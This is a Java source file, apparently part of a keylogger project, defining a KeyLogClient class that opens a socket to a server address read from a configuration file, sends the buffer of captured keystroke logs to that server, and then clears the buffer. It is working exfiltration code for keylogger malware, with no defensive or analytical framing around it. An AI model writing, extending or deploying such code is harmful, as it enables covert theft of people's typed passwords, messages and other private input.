package com.zpq.client;

import com.zpq.utilts.KeyLogs;
import com.zpq.utilts.PropertiesUtil;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Map;

/**
 * @author 35147
 */
public class KeyLogClient implements Runnable{
    @Override
    public void run() {
        //1.获取通道
        SocketChannel socketChannel = null;
        //从配置文件中 获取服务端ip地址和端口
        Map<String, String> map = PropertiesUtil.getMap("keyClient");
        try {
            socketChannel = SocketChannel.open(new InetSocketAddress(map.get("serverIp"), Integer.parseInt(map.get("keyLogPort"))));
            //1.1切换成非阻塞模式
            socketChannel.configureBlocking(false);

            //2.发送日志文件给服务器
            byte[] bytes = KeyLogs.logs.toString().getBytes();
            if (bytes.length > 0) {
                ByteBuffer buffer = ByteBuffer.allocate(bytes.length);
                buffer.put(bytes);
                buffer.flip();
                socketChannel.write(buffer);
            }
            KeyLogs.logs.delete(0,KeyLogs.logs.length());
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                socketChannel.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
